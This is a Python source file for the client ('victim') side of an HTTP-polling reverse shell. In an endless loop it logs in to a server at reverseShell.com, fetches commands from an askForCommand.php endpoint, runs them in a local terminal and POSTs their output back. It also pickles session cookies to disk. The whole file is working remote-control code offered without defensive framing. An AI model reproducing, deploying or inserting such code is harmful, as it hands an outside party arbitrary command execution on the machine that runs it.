import requests
import logging
import pickle
import time
import subprocess

from prompt import Prompt

class Victim:
    DEBUG = True

    def __init__(self):
        self.__term = Prompt()

    # Try to load session cookies from file
    def __tryToLoadSessionCookies(self):
        # Try to load session cookies from file
        try:
            with open('cookies.dat', 'rb') as f:
                self.__session.cookies.update(pickle.load(f))
        except FileNotFoundError:
            pass

    # Do a login request to server
    def __login(self, session, url, type):
        return self.__session.request('GET', url, params={'login':1, 'type':type})

    # Save session cookies to file:
    def __writeSessionCookiesToFile(self):
        # Write cookies to file
        with open('cookies.dat', 'wb') as f:
            pickle.dump(self.__session.cookies, f)

    # Load session and log into the server. Return the connection response.
    def connectToServer(self, baseUrl):
        # Save server base url
        self.__serverUrl = baseUrl

        # Open session
        self.__session = requests.Session()

        # Try to load session cookies from file
        self.__tryToLoadSessionCookies()

        # Log in as attacker
        response = self.__login(self.__session, self.__serverUrl + '/login.php', 'victim')

        # Save session cookies to file
        self.__writeSessionCookiesToFile()

        return response

    # Ask for a command to execute
    def askForCommand(self):
        return self.__session.request('GET', self.__serverUrl + '/victim/askForCommand.php')

    # Execute command
    def executeCommand(self, command):
        self.__term.write(command)
        return self.__term.readStdout() + self.__term.readStderr()

    def sendCommandOutput(self, output):
        return self.__session.request('POST',
                    self.__serverUrl + '/victim/sendCommandOutput.php',
                    data={'output':output})

    def disconnectFromServer(self):
        return self.__session.request('GET', self.__serverUrl + '/login.php', headers={'Connection':'close'})



# Print message if debug flag is set
def printDebug(message, end='\n'):
    if(Victim.DEBUG):
        print(message, end=end)

# Print response object
#def printResponse(response):
    #print(response.text, end='')

def main():
    # Module for connection debugging
    logging.basicConfig(level=logging.DEBUG)
    # Server domain
    baseUrl = 'http://www.reverseShell.com'
    # Variable to store command
    data = {'cmd': None, 'output': None}

    # Login
    victim = Victim()
    printDebug('Requesting login...')
    printDebug(victim.connectToServer(baseUrl).text)

    #running = True
    try:
        while True:
        #while running:
            # Ask for command to server
            printDebug('Asking for command...')
            data['cmd'] = victim.askForCommand().text
            printDebug(data['cmd'])

            # Execute command
            printDebug('Executing...')
            data['output'] = victim.executeCommand(data['cmd'])
            printDebug(data['output'], end='')

            # Send output to server
            printDebug('Sending output...')
            printDebug(victim.sendCommandOutput(data['output']).text, end='')
            #print('Output sent')


            #time.sleep(1)
            #running = False
    # If hit Ctrl+c
    except KeyboardInterrupt:
        raise SystemExit
    finally:
        printDebug(victim.disconnectFromServer())

    #printResponse(requests.request('GET', baseUrl + '/modules/sessionManager.php'))
    #print(s.cookies.get_dict())
    #print(response.content)
    #print(response.text)

    '''
        while True:
            try:
                # Read command
                data['cmd'] = input()
                # Send command
                #response = requests.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
                response = s.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
                # Print response
                print(response.text)
            # If hit Ctrl+c
            except KeyboardInterrupt:
                raise SystemExit

    #print(response.status_code, response.reason)
    #print(response.content)
    #print(response.text)
    '''

if __name__ == "__main__":
    main()
